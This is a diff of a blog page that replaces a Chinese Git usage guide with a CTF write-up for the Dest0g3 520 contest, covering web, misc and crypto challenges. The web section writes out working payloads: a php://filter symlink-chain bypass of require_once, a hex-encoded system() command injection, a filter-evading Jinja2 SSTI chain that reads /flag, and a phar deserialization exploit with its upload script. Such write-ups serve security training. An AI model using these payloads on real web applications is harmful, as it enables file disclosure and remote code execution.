@@ -4,15 +4,10 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="github使用, Ethe&#39;s blog">
-    <meta name="description" content="​    在学python的时候顺便学了些GitHub的使用，写个文档防止忘了
- 
+    <meta name="keywords" content="dest0g3 520迎新赛wp, Ethe&#39;s blog">
+    <meta name="description" content="webphpdest和wm2020年的题一样
 
-绑定用户
-打开git-bash
-填写用户名和密码
-提示（配置的帐号名和邮箱一定要与GitHub相同，不然会提交失败）
-git config --globa">
+php的文件包含机制是将已经包含的文件与文件的真实路径放进哈希表中，如果require_once(‘flag.php’)，include的文件不运行再通过require_once包含。通过知识">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -24,7 +19,7 @@ git config --globa">
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>github使用 | Ethe&#39;s blog</title>
+    <title>dest0g3 520迎新赛wp | Ethe&#39;s blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -328,12 +323,12 @@ git config --globa">
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/14.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/7.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">github使用</h1>
+                    <h1 class="description center-align post-title">dest0g3 520迎新赛wp</h1>
                 </div>
             </div>
         </div>
@@ -463,8 +458,8 @@ git config --globa">
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E9%9A%8F%E7%AC%94/">
-                                <span class="chip bg-color">随笔</span>
+                            <a href="/tags/ctf/">
+                                <span class="chip bg-color">ctf</span>
                             </a>
                         
                     </div>
@@ -479,28 +474,28 @@ git config --globa">
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-10-02
+                    2022-05-20
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-03-28
+                    2022-05-27
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    532
+                    2.5k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    2 分
+                    13 分
                 </div>
                 
 
@@ -523,60 +518,249 @@ git config --globa">
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>​    在学python的时候顺便学了些GitHub的使用，写个文档防止忘了</p>
- <span id="more"></span>
+                <h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="phpdest"><a href="#phpdest" class="headerlink" title="phpdest"></a>phpdest</h2><p>和wm2020年的题一样</p>
+<blockquote>
+<p>php的文件包含机制是将已经包含的文件与文件的真实路径放进哈希表中，如果require_once(‘flag.php’)，include的文件不运行再通过require_once包含。<br>通过知识点：/proc/self指向当前进程的/proc/pid/，/proc/self/root/是指向/的符号链接，利用伪协议配合多级符号链接的办法进行绕过。</p>
+</blockquote>
+<p>payload</p>
+<pre class="language-php" data-language="php"><code class="language-php">php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</code></pre>
 
-<p><strong>绑定用户</strong></p>
-<p>打开git-bash</p>
-<p>填写用户名和密码</p>
-<p>提示（配置的帐号名和邮箱一定要与GitHub相同，不然会提交失败）</p>
-<pre class="language-none"><code class="language-none">git config --global user.name &quot;@@@&quot;     (GitHub相对应的帐号名称)
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/Dest0g3%20520/image-20220520133732748.png" alt="image-20220520133732748"></p>
+<p>解码拿到flag</p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/213235#h3-3">php源码分析 require_once 绕过不能重复包含文件的限制 - 安全客，安全资讯平台 (anquanke.com)</a></p>
+<h2 id="EasyPHP"><a href="#EasyPHP" class="headerlink" title="EasyPHP"></a>EasyPHP</h2><p>应该是要利用报错进入set_error_handler里，传个数组就成功了</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/Dest0g3%20520/image-20220520134227015.png" alt="image-20220520134227015"></p>
+<h2 id="SimpleRCE"><a href="#SimpleRCE" class="headerlink" title="SimpleRCE"></a>SimpleRCE</h2><p>利用进制编码和通配符绕过</p>
+<p>payload</p>
+<pre class="language-txt" data-language="txt"><code class="language-txt">aaa&#x3D;hex2bin(&#39;73797374656d&#39;)(&#39;uniq &#x2F;f*&#39;);</code></pre>
 
-git config --global user.email &quot;123@163.com&quot;  （GitHbu相对应的邮箱帐号）
-</code></pre>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/Dest0g3%20520/image-20220520135650912.png" alt="image-20220520135650912"></p>
+<h2 id="EasySSTI"><a href="#EasySSTI" class="headerlink" title="EasySSTI"></a>EasySSTI</h2><p>用这篇文章里的方法改改就行<a target="_blank" rel="noopener" href="https://chenlvtang.top/2021/03/31/SSTI%E8%BF%9B%E9%98%B6/">https://chenlvtang.top/2021/03/31/SSTI%E8%BF%9B%E9%98%B6/</a></p>
+<pre class="language-none"><code class="language-none">首先用%0a绕过空格的过滤，然后利用&#123;%%&#125;和set绕过关键字，利用pop和()|select|string|list得到下划线，最后就是用__getitem__
 
-<p><strong>设置ssh key</strong></p>
-<p>生成ssh key</p>
-<p>首先检查是否已生成密钥 cd ~/.ssh，ls如果有3个文件，则密钥已经生成，id_rsa.pub就是公钥</p>
-<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcyMDE4LmNuYmxvZ3MuY29tL2Jsb2cvNzc0ODI0LzIwMTkwNy83NzQ4MjQtMjAxOTA3MTExNDU0MTYwMjAtOTMyNTYwNjcxLnBuZw?x-oss-process=image/format,png" alt="img"></p>
-<p> 如果没有，输入: ssh-keygen -t rsa -C &quot;你的邮箱&quot;</p>
-<p>复制ssh key</p>
-<p> 方法1: 输入 clip &lt; ~/.ssh/id_rsa.pub   会自动复制ssh key，可以直接粘贴</p>
-<p> 方法2:在c/Users/Administrator/.ssh/id_rsa)文件找到直接复制</p>
-<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcyMDE4LmNuYmxvZ3MuY29tL2Jsb2cvNzc0ODI0LzIwMTkwNy83NzQ4MjQtMjAxOTA3MTExNTA5MzI2MTItMTQ3ODE2MTQ3NC5wbmc?x-oss-process=image/format,png" alt="img"></p>
-<p>连接github，打开GitHub 进入setting找到ssh key并新建</p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/github%E4%BD%BF%E7%94%A8/format,png.png" alt="img">format,png.png)</p>
-<p>然后测试连接是否成功</p>
-<p>输入: ssh -T <a href="mailto:&#103;&#x69;&#116;&#x40;&#x67;&#105;&#116;&#104;&#117;&#x62;&#x2e;&#99;&#x6f;&#109;">&#103;&#x69;&#116;&#x40;&#x67;&#105;&#116;&#104;&#117;&#x62;&#x2e;&#99;&#x6f;&#109;</a> </p>
-<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcyMDE4LmNuYmxvZ3MuY29tL2Jsb2cvNzc0ODI0LzIwMTkwNy83NzQ4MjQtMjAxOTA3MTExNTI1MDg3MzYtNDUwMTA1MTMwLnBuZw?x-oss-process=image/format,png" alt="img"></p>
-<p><strong>上传</strong></p>
-<p>上传的基本步骤就是这样了</p>
-<p>先打开一个文件夹按着图片里的步骤来</p>
-<p>先初始化再把想传的文件传上去</p>
-<p>可以用git add .上传所有文件</p>
-<pre class="language-none"><code class="language-none">注：
-输入git add .后如果报错
-warning: LF will be replaced by CRLF in gradlew.
-The file will have its original line endings in your working directory
+构造类似x.__init__.__globals__[&#39;__builtins__&#39;].chr 这种payload得到chr和open，猜测flag在根目录下的&#x2F;flag中，尝试读取
 
-则再输入git config --global core.autocrlf false后再重新输入git add .命令即可</code></pre>
+最终payload</code></pre>
 
-<p>git commit添加备注</p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/github%E4%BD%BF%E7%94%A8/image-20211002123234287.png" alt="image-20211002123234287"></p>
-<p>克隆仓库</p>
-<pre class="language-console" data-language="console"><code class="language-console">$ git clone 网址 [自定义目录名]</code></pre>
 
-<p>可以用https://或git://或ssh传输协议</p>
-<p>查看连接的仓库地址</p>
-<pre class="language-none"><code class="language-none">git remote -v</code></pre>
 
-<p>如果在另外的文件夹提交需重新进行一遍图中步骤</p>
-<p>还要再push前输入</p>
-<pre class="language-none"><code class="language-none">git pull --rebase origin main</code></pre>
+<pre class="language-python" data-language="python"><code class="language-python">username&#x3D;&#123;%set%0apo&#x3D;dict(po&#x3D;a,p&#x3D;a)|join%&#125;&#123;%set%0aa&#x3D;(()|select|string|list)|attr(po)(24)%&#125;&#123;%set%0aini&#x3D;(a,a,dict(in&#x3D;a,it&#x3D;a)|join,a,a)|join()%&#125;&#123;%set%0aglo&#x3D;(a,a,dict(gl&#x3D;a,obals&#x3D;a)|join,a,a)|join()%&#125;&#123;%set%0ageti&#x3D;(a,a,dict(getit&#x3D;a,em&#x3D;a)|join,a,a)|join()%&#125;&#123;%set%0abuilt&#x3D;(a,a,dict(bui&#x3D;a,ltins&#x3D;a)|join,a,a)|join()%&#125;&#123;%set%0ax&#x3D;(q|attr(ini)|attr(glo)|attr(geti))(built)%&#125;&#123;%%0aset%0ach&#x3D;dict(ch&#x3D;a,r&#x3D;a)|join%&#125;&#123;%set%0ax&#x3D;(q|attr(ini)|attr(glo)|attr(geti))(built)%&#125;&#123;%set%0achr&#x3D;(x|attr(geti))(ch)%&#125;&#123;%set%0afile&#x3D;chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%&#125;&#123;%%0aset%0aop&#x3D;dict(ope&#x3D;a,n&#x3D;a)|join%&#125;&#123;%set%0aopen&#x3D;(x|attr(geti))(op)%&#125;&#123;%%0aset%0are&#x3D;dict(re&#x3D;a,ad&#x3D;a)|join%&#125;&#123;%print(open(file)|attr(re)())%&#125;&amp;password&#x3D;x</code></pre>
 
-<p>该命令的意思是把远程库中的<strong>更新合并</strong>到（<strong>pull=fetch+merge</strong>）本地库中，<strong>–-rebase</strong>的作用是取消掉本地库中刚刚的commit，并把他们<strong>接到</strong>更新后的版本库之中。出现如下图执行pull执行成功后，可以成功执行git push origin main操作。</p>
-<p>否则就会因为本地库与远程库不一致导致报错</p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/github%E4%BD%BF%E7%94%A8/image-20211002130237512.png" alt="image-20211002130237512"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/Dest0g3%20520/image-20220521162208161.png" alt="image-20220521162208161"></p>
+<h2 id="PharPOP"><a href="#PharPOP" class="headerlink" title="PharPOP"></a>PharPOP</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?php
+highlight_file(__FILE__);
+
+function waf($data)&#123;
+    if (is_array($data))&#123;
+        die(&quot;Cannot transfer arrays&quot;);
+    &#125;
+    if (preg_match(&#39;&#x2F;get|air|tree|apple|banana|php|filter|base64|rot13|read|data&#x2F;i&#39;, $data)) &#123;
+        die(&quot;You can&#39;t do&quot;);
+    &#125;
+&#125;
+
+class air&#123;
+    public $p;
+
+    public function __set($p, $value) &#123;
+        $p &#x3D; $this-&gt;p-&gt;act;
+        echo new $p($value);
+    &#125;
+&#125;
+
+class tree&#123;
+    public $name;
+    public $act;
+
+    public function __destruct() &#123;
+        return $this-&gt;name();
+    &#125;
+    public function __call($name, $arg)&#123;
+        $arg[1] &#x3D;$this-&gt;name-&gt;$name;
+
+    &#125;
+&#125;
+
+class apple &#123;
+    public $xxx;
+    public $flag;
+    public function __get($flag)
+    &#123;
+        $this-&gt;xxx-&gt;$flag &#x3D; $this-&gt;flag;
+    &#125;
+&#125;
+
+class D &#123;
+    public $start;
+
+    public function __destruct()&#123;
+        $data &#x3D; $_POST[0];
+        if ($this-&gt;start &#x3D;&#x3D; &#39;w&#39;) &#123;
+            waf($data);
+            $filename &#x3D; &quot;&#x2F;tmp&#x2F;&quot;.md5(rand()).&quot;.jpg&quot;;
+            file_put_contents($filename, $data);
+            echo $filename;
+        &#125; else if ($this-&gt;start &#x3D;&#x3D; &#39;r&#39;) &#123;
+            waf($data);
+            $f &#x3D; file_get_contents($data);
+            if($f)&#123;
+                echo &quot;It is file&quot;;
+            &#125;
+            else&#123;
+                echo &quot;You can look at the others&quot;;
+            &#125;
+        &#125;
+    &#125;
+&#125;
+
+class banana &#123;
+    public function __get($name)&#123;
+        return $this-&gt;$name;
+    &#125;
+&#125;
+&#x2F;&#x2F; flag in &#x2F;
+if(strlen($_POST[1]) &lt; 55) &#123;
+    $a &#x3D; unserialize($_POST[1]);
+&#125;
+else&#123;
+    echo &quot;str too long&quot;;
+&#125;
+
+throw new Error(&quot;start&quot;);
+?&gt;</code></pre>
+
+<p>题目很明显是要先post参数1去调用D类里的file_put_content，然后写入我们的phar文件，再通过file_get_content去访问phar文件来实现反序列化，从air类里的<code>echo new $p($value);</code>也能看出这里要用原生类来读目录和文件。</p>
+<p>链子很简单，就不说了。这里主要的难度是绕过最后的<code>throw new Error(&quot;start&quot;);</code>语句，如果想利用destruct方法反序列化会因为最后的抛出错误的语句导致程序提前结束，所以这里要利用unset来绕过最后的错误，让反序列化成功进行</p>
+<p>具体的步骤看这个</p>
+<p>[<a target="_blank" rel="noopener" href="https://blog.csdn.net/cosmoslin/article/details/120797688">phar反序列化][NSSCTF]prize_p1_Snakin_ya的博客-CSDN博客</a></p>
+<p>所以写文件时：</p>
+<p>参数1：</p>
+<pre class="language-none"><code class="language-none">O:1:&quot;D&quot;:2:&#123;s:5:&quot;start&quot;;s:1:&quot;w&quot;;s:4:&quot;star&quot;;O:1:&quot;D&quot;:1:N&#125;</code></pre>
+
+<p>参数0：</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/Dest0g3%20520/image-20220522131509238.png" alt="image-20220522131509238"></p>
+<p>生成phar文件之后在010里进行修改（这是读文件的phar，读目录的时候忘了截图被覆盖了</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/Dest0g3%20520/image-20220522133028155.png" alt="image-20220522133028155"></p>
+<p>然后修改签名</p>
+<pre class="language-python" data-language="python"><code class="language-python">from hashlib import sha1
+
+file &#x3D; open(&#39;..&#x2F;php&#x2F;NSSCTF prize_p1&#x2F;ars.phar&#39;, &#39;rb&#39;).read()
+
+text &#x3D; file[:-28]  #读取开始到末尾除签名外内容
+
+last &#x3D; file[-8:]   #读取最后8位的GBMB和签名flag
+
+new_file &#x3D; text+sha1(text).digest() + last  #生成新的文件内容，主要是此时sha1正确了。
+
+open(&#39;reaflag2.phar&#39;, &#39;wb&#39;).write(new_file)</code></pre>
+
+<p>达到调用unset的目的</p>
+<p>然后要绕过代码中的waf，可以对phar文件进行压缩，原理可以看这个<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/240007#h2-5">https://www.anquanke.com/post/id/240007#h2-5</a></p>
+<p>再利用python脚本上传文件</p>
+<pre class="language-none"><code class="language-none">import request
+url &#x3D; &#39;http:&#x2F;&#x2F;8bfdc886-3097-4a19-978d-9a417e256662.node4.buuoj.cn:81&#x2F;&#39;
+
+res &#x3D; requests.post(
+    url,
+    data&#x3D;&#123;
+        1: &#39;O:1:&quot;D&quot;:2:&#123;s:5:&quot;start&quot;;s:1:&quot;w&quot;;s:4:&quot;star&quot;;O:1:&quot;D&quot;:1:N&#125;&#39;,
+        0: open(&#39;.&#x2F;reaflag2.phar.gz&#39;, &#39;rb&#39;).read()
+    &#125;
+) # 写入
+print(res.text)</code></pre>
+
+<p>得到上传地址之后利用phar协议访问一下就行。</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/Dest0g3%20520/image-20220522131430525.png" alt="image-20220522131430525"></p>
+<p>改phar内容的时候不能用txt，上传也不能用burp，这两个卡了我好久。。。</p>
+<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="Welcome-to-fxxking-DestCTF"><a href="#Welcome-to-fxxking-DestCTF" class="headerlink" title="Welcome to fxxking DestCTF"></a>Welcome to fxxking DestCTF</h2><p>纯签到</p>
+<h2 id="Pngenius"><a href="#Pngenius" class="headerlink" title="Pngenius"></a>Pngenius</h2><p>图片里有个压缩包，分离出来之后发现需要密码，猜测密码也在图片里，zsteg跑一遍</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/Dest0g3%20520/image-20220520142310366.png" alt="image-20220520142310366"></p>
+<p>拿到密码,打开压缩包找到flag</p>
+<h2 id="EasyEncode"><a href="#EasyEncode" class="headerlink" title="EasyEncode"></a>EasyEncode</h2><p>爆破跑密码</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/Dest0g3%20520/image-20220520155335442.png" alt="image-20220520155335442"></p>
+<p>里面是摩斯密码，解码之后是一大串数字</p>
+<pre class="language-txt" data-language="txt"><code class="language-txt">5 C 7 5 3 0 3 0 3 5 3 2 5 C 7 5 3 0 3 0 3 4 3 7 5 C 7 5 3 0 3 0 3 5 3 6 5 C 7 5 3 0 3 0 3 7 6 1 5 C 7 5 3 0 3 0 3 6 3 4 5 C 7 5 3 0 3 0 3 4 3 4 5 C 7 5 3 0 3 0 3 4 3 2 5 C 7 5 3 0 3 0 3 6 6 5 5 C 7 5 3 0 3 0 3 4 6 4 5 C 7 5 3 0 3 0 3 3 3 3 5 C 7 5 3 0 3 0 3 7 3 4 5 C 7 5 3 0 3 0 3 4 3 5 5 C 7 5 3 0 3 0 3 5 6 1 5 C 7 5 3 0 3 0 3 5 3 7 5 C 7 5 3 0 3 0 3 3 3 9 5 C 7 5 3 0 3 0 3 6 6 2 5 C 7 5 3 0 3 0 3 6 3 1 5 C 7 5 3 0 3 0 3 5 3 7 5 C 7 5 3 0 3 0 3 3 3 5 5 C 7 5 3 0 3 0 3 6 6 5 5 C 7 5 3 0 3 0 3 5 3 8 5 C 7 5 3 0 3 0 3 7 6 1 5 C 7 5 3 0 3 0 3 4 3 6 5 C 7 5 3 0 3 0 3 7 6 1 5 C 7 5 3 0 3 0 3 5 3 8 5 C 7 5 3 0 3 0 3 3 3 2 5 C 7 5 3 0 3 0 3 5 3 5 5 C 7 5 3 0 3 0 3 3 3 0 5 C 7 5 3 0 3 0 3 6 3 3 5 C 7 5 3 0 3 0 3 3 3 3 5 C 7 5 3 0 3 0 3 6 6 3 5 C 7 5 3 0 3 0 3 6 3 6 5 C 7 5 3 0 3 0 3 4 6 5 5 C 7 5 3 0 3 0 3 4 3 6 5 C 7 5 3 0 3 0 3 3 3 9 5 C 7 5 3 0 3 0 3 5 3 6 5 C 7 5 3 0 3 0 3 6 3 6 5 C 7 5 3 0 3 0 3 5 3 1 5 C 7 5 3 0 3 0 3 2 3 5 5 C 7 5 3 0 3 0 3 3 3 3 5 C 7 5 3 0 3 0 3 4 3 4 5 C 7 5 3 0 3 0 3 2 3 5 5 C 7 5 3 0 3 0 3 3 3 3 5 C 7 5 3 0 3 0 3 4 3 4 </code></pre>
+
+<p>复制到010里发现是Unicode编码</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/Dest0g3%20520/image-20220520162301828.png" alt="image-20220520162301828"></p>
+<p>Unicode解码发现是base64，再解码得到flag</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/Dest0g3%20520/image-20220520162337045.png" alt="image-20220520162337045"></p>
+<h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="babyRSA"><a href="#babyRSA" class="headerlink" title="babyRSA"></a>babyRSA</h2><p>已知nce，要求出明文，就要先想办法求出qpd，</p>
+<p>利用RsaCtfTool.py进行求解</p>
+<p>求公钥</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/Dest0g3%20520/image-20220520151555940.png" alt="image-20220520151555940"></p>
+<p>然后再求私钥</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/Dest0g3%20520/image-20220520151624537.png" alt="image-20220520151624537"></p>
+<p>最后得到qpd</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/Dest0g3%20520/image-20220520151647055.png" alt="image-20220520151647055"></p>
+<p>随便找个rsa脚本套进去就行了</p>
+<pre class="language-python" data-language="python"><code class="language-python">from Crypto.Util.number import long_to_bytes
+string &#x3D; &#39;&#39;
+for x in range(1):
+   c &#x3D; 14181751948841206148995320731138166924841307246014981115736748934451763670304308496261846056687977917728671991049712129745906089287169170294259856601300717330153987080212591008738712344004443623518040786009771108879196701679833782022875324499201475522241396314392429412747392203809125245393462952461525539673218721341853515099201642769577031724762640317081252046606564108211626446676911167979492329012381654087618979631924439276786566078856385835786995011067720124277812004808431347148593882791476391944410064371926611180496847010107167486521927340045188960373155894717498700488982910217850877130989318706580155251854
+   q &#x3D; 165143607013706756535226162768509114446233024193609895145003307138652758365886458917899911435630452642271040480670481691733000313754732183700991227511971005378010205097929462099354944574007393761811271098947894183507596772524174007304430976545608980195888302421142266401500880413925699125132100053801973969401
+   p &#x3D; 165143607013706756535226162768509114446233024193609895145003307138652758365886458917899911435630452642271040480670481691733000313754732183700991227511971005378010205097929462099354944574007393761811271098947894183507596772524174007304430976545608980195888302421142266401500880413925699125132100053801973971467
+   n &#x3D; 27272410937497615429184017335437367466288981498585803398561456300019447702001403165885200936510173980380489828828523983388730026101865884520679872671569532101708469344562155718974222196684544003071765625134489632331414011555536130289106822732544904502428727133498239161324625698270381715640332111381465813621908465311076678337695819124178638737015840941223342176563458181918865641701282965455705790456658431641632470787689389714643528968037519265144919465402561959014798324908010947632834281698638848683632113623788303921939908168450492197671761167009855312820364427648296494571794298105543758141065915257674305081267
+   e &#x3D; 65537
+   #d &#x3D; libnum.invmod(e, (p - 1) * (q - 1))
+   d &#x3D; 3121448257353397521008122343609193178885723335228834266026969249529973560167730063129299361044338541996643944734161746790345361029496254021234107830835147478445995827602129027084328557873121512535534338680955898684986137612006599528489101993024083016810624261537303995439156771941439694356136703960699682133382027158795284121176051335224541792139301998430867357667228591618159856224671481257868298256833038515716847186893503607277761265884934308680131384025054980116408946675249894376907198506526558779944638834026881901482983419902337359310844362781386068641635065060468067278449010820146945870895885764387716082673
+   m &#x3D; pow(c, d, n)
+   string +&#x3D; str(long_to_bytes(m),&#39;utf-8&#39;)
+print(string)</code></pre>
+
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/Dest0g3%20520/image-20220520151729727.png" alt="image-20220520151729727"></p>
+<h2 id="babyAES"><a href="#babyAES" class="headerlink" title="babyAES"></a>babyAES</h2><p>这个怎么说呢。。。确实很简单</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/Dest0g3%20520/image-20220520153806437.png" alt="image-20220520153806437"></p>
+<p>只要把给的值带进去然后把加密改成解密就行了</p>
+<h2 id="ezDLP"><a href="#ezDLP" class="headerlink" title="ezDLP"></a>ezDLP</h2><p>离散对数问题</p>
+<p>直接用sage求就行</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/Dest0g3%20520/image-20220521223939336.png" alt="image-20220521223939336"></p>
+<p>然后将结果转成十六进制再转换成字符</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/Dest0g3%20520/image-20220521224029558.png" alt="image-20220521224029558"></p>
+<h2 id="ezStream"><a href="#ezStream" class="headerlink" title="ezStream"></a>ezStream</h2><p>0xGame2021有个差不多的，直接抄一下现成的脚本</p>
+<pre class="language-python" data-language="python"><code class="language-python">from Crypto.Util.number import *
+
+
+base &#x3D; pow(2,32)
+
+i &#x3D; 104984523
+a &#x3D; 3939333498
+b &#x3D; 3662432446
+m &#x3D; 2271373817
+state1 &#x3D; 17362
+state2 &#x3D; 20624
+# while i &lt;&#x3D; base:
+#     # print(i)
+#     if ((a*i+b)%m)&gt;&gt;16 &#x3D;&#x3D; state1 and ((((a*i+b)%m)*a+b)%m)&gt;&gt;16 &#x3D;&#x3D; state2:
+#         print(&#39;find it&#39;,i)
+#         break
+#     i+&#x3D;1
+seed &#x3D; 104984523
+#
+class LCG:
+    def __init__(self):
+        self.a &#x3D; a
+        self.b &#x3D; b
+        self.m &#x3D; m
+        self.seed &#x3D; 104984523
+    def next(self):
+        self.seed &#x3D; (self.a * self.seed + self.b) % self.m
+        return self.seed &gt;&gt; 16
+
+    def output(self):
+        print(&quot;a &#x3D; &#123;&#125;\nb &#x3D; &#123;&#125;\nm &#x3D; &#123;&#125;&quot;.format(self.a, self.b, self.m))
+        print(&quot;state1 &#x3D; &#123;&#125;&quot;.format(self.next()))
+        print(&quot;state2 &#x3D; &#123;&#125;&quot;.format(self.next()))
+lcg &#x3D; LCG()
+lcg.output()
+flag &#x3D; long_to_bytes(&#39;600017039001091357643174067454938198067935635401496485588306838343558125283178792619821966678282131419050878&#39;).decode()
+
+c &#x3D; b&#39;&#39;.join([long_to_bytes(ord(flag[i]) ^ (lcg.next() % 10))
+              for i in range(len(flag))])
+print(c)</code></pre>
+
+<p>利用注释的那段爆出seed的值，然后带进去就行</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/Dest0g3%20520/image-20220522150127328.png" alt="image-20220522150127328"></p>
 
                 
             </div>
@@ -603,7 +787,7 @@ The file will have its original line endings in your working directory
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://Ethe448.github.io/2021/10/02/github%E4%BD%BF%E7%94%A8/">https://Ethe448.github.io/2021/10/02/github%E4%BD%BF%E7%94%A8/</a>
+                    <a href="https://Ethe448.github.io/2022/05/20/520%E8%BF%8E%E6%96%B0%E8%B5%9Bwp/">https://Ethe448.github.io/2022/05/20/520%E8%BF%8E%E6%96%B0%E8%B5%9Bwp/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -641,8 +825,8 @@ The file will have its original line endings in your working directory
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/%E9%9A%8F%E7%AC%94/">
-                                    <span class="chip bg-color">随笔</span>
+                                <a href="/tags/ctf/">
+                                    <span class="chip bg-color">ctf</span>
                                 </a>
                             
                         </div>
@@ -1082,17 +1266,18 @@ The file will have its original line endings in your working directory
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2022/01/19/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/">
+                <a href="/2022/05/20/520%E8%BF%8E%E6%96%B0%E8%B5%9Bwp/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="buu刷题记录(二)">
+                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="dest0g3 520迎新赛wp">
                         
-                        <span class="card-title">buu刷题记录(二)</span>
+                        <span class="card-title">dest0g3 520迎新赛wp</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1102,9 +1287,9 @@ The file will have its original line endings in your working directory
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-01-19
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-05-20
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -1113,6 +1298,7 @@ The file will have its original line endings in your working directory
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -1131,24 +1317,24 @@ The file will have its original line endings in your working directory
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/08/31/%E6%80%BB%E7%BB%93/">
+                <a href="/2022/05/12/%E9%99%87%E5%8E%9F%E6%88%98%E5%BD%B9%E5%A4%8D%E7%8E%B0/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="总结">
